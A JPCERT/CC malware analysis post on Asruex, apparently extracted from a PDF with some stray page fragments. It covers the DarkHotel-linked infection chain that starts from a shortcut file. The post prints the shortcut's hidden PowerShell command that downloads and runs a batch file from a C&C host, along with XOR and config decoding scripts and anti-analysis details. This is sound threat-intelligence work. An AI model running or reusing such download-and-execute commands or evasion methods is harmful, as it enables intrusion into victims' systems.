Asruex: Malware Infecting through Shortcut
Files
JPCERT/CC has been observing malicious shortcut files that are sent as email
attachments to a limited range of organisations since around October 2015. When this
shortcut file is opened, the host will be infected with malware called “Asruex”. The
malware has a remote controlling function, and attackers sending these emails seem to
attempt intruding into the targets’ network using the malware. According to a blog article
by Microsoft, the malware is associated with an attacker group identified as “DarkHotel”
[1]. This blog entry will introduce the details of Asruex.

Figure 1: Chain of events after a victim opens the malicious shortcut file until the
host gets infected with Asruex

For those cases that JPCERT/CC has observed, when the shortcut file is opened, a
downloader is downloaded from a C&C server and then executed. The downloader then
downloads Asruex from another C&C server, which is then executed. Detailed behaviour
observed in each phase will be explained in the next section.

Details of the Shortcut File
Follow us @jpcert_en

When the malicious shortcut file is opened, the following PowerShell command in the file
is executed.

RSS feed
Contributor info

powershell -windowstyle hidden $c='(new-object System.Net.WebClient).D'+'ownloadFile("""http://onlinedropbox.com/online/a
""", """$env:tmp\gst.bat""")';Invoke-Expression
$c&%tmp%\gst.bat "%CD%"

The above PowerShell command downloads a file from the specified URL, and it is saved
as a batch file to be executed. The batch file contains the following commands, which
execute PowerShell scripts (marked in red).
echo
powershell -Enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUw…

del /f "%1\*.*.lnk"
echo
powershell -Enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMA…
"%tmp%\dwm.exe"

When the batch file is executed, a Windows executable file (a downloader) and a dummy
file for display will be downloaded from a C&C server, saved in %TEMP% folder and then
executed. Those decoy documents are written in Japanese, but some are also in
Chinese, which implies that the target for this attack is not limited to Japanese
organisations.
Details of the Downloader
When the downloader is executed, it downloads a .jpg or .gif image file. Encoded Asruex
is contained in the latter part of the image file. The downloader decodes it and then
executes the malware.

Figure 2: An Image File Containing Encoded Asruex

Mongolia

Asruex contained in the image file is encoded using XOR. The following Python script is
used for decoding the encoded data of the image file. The size of the encoded data is
specified in the last 4 bytes of the image file.

Myanmar

key = 0x1D # Keys may vary depending on the sample
for i in range(0, length):
buf[i] = chr(ord(buf[i]) ^ key)
key += 0x5D
key &=0xff

The downloader may contain an encoded executable file of Process Hacker (a multifunction task manager), and it may execute the Process Hacker if an anti-virus software is
detected. Anti-virus software such as by Symantec, McAfee and Kaspersky, etc., are
detected based on the process names.
Details of Asruex
Asruex is a kind of malware that communicates with the C&C server over HTTP, and
executes the command received through the communication. It has various anti-analysis
features such as preventing the malware from running when it detects a virtual machine.
Please refer to Appendix A for conditions which Asruex detects a virtual machine. The
malware is also capable of detecting anti-virus software.
If Asruex does not detect a virtual machine, it executes one of the following executable
files, and injects a DLL file which is contained in Asruex. In case where it detects antivirus software, Asruex generates a DLL file and loads it to itself (but does not perform
DLL injection). This DLL file contains the core functions of Asruex.
sdiagnhost.exe
wksprt.exe
taskhost.exe
dwm.exe
winrshost.exe
wsmprovhost.exe
ctfmon.exe
explorer.exe
The DLL injected, or generated and loaded, sends an HTTP request to a dummy host. If it
receives a reply of status code that is 100 or greater, it connects to an actual C&C server
as follows:

Host: [host name]

Asruex operates based on the configuration information stored in itself. The configuration
Information includes C&C servers and dummy hosts that it connects to, and also version
information and a key to decode data which is delivered. For further details on the
configuration information, please refer to Appendix B.
The configuration information is encoded. It can be decoded with the following Python
code:
(config_size,) = struct.unpack("=I", data[offset:offset+4])
config_offset = offset + 4
encode_config = data[config_offset:config_offset+config_size]
i = 0
seed = config_size * 2 // It does not necessarily double
while i < config_size:
(result, seed) = rand_with_seed(seed)
result &= 0xff
decode_data.append(chr(ord(encode_config[i]) ^ result))
i += 1
decode_config = "".join(decode_data)
(decode_size,) = struct.unpack("=I", decode_config[config_size-4:config_size])
config = lznt1_decompress(decode_config, config_size, decode_size)

Asruex executes commands that are received from a C&C server. Commands that are
possibly executed are listed in Table 1. Most of the commands are used for collecting
information, but some are for downloading DLL files (AdvProv.dll) from C&C servers and
for executing them. AdvProv.dll is a plug-in to expand functions of Asruex.

Details of AdvProv.dll
AdvProv.dll is encrypted using XOR and 3DES. Decryption key is calculated based on the
destination URL and the encoding key of the configuration information. Asruex downloads
a DLL, loads it into the memory and executes DLL’s export function, Get_CommandProc.
AdvProv.dll adds the following commands to Asruex:

Samples of AdvProv.dll that JPCERT/CC has observed had the listed functions. However,
there may be some other versions with different functions.
Summary
Asruex is a relatively new kind of malware that has been seen since around October
2015. It is likely that targeted attacks using Asruex will continue.
Hash values of artifacts demonstrated in this article are described in Appendix C. Also,
destination URLs confirmed by JPCERT/CC are listed in Appendix D. It is recommended
to make sure that the hosts you use are not accessing these URLs.
Thanks for reading.
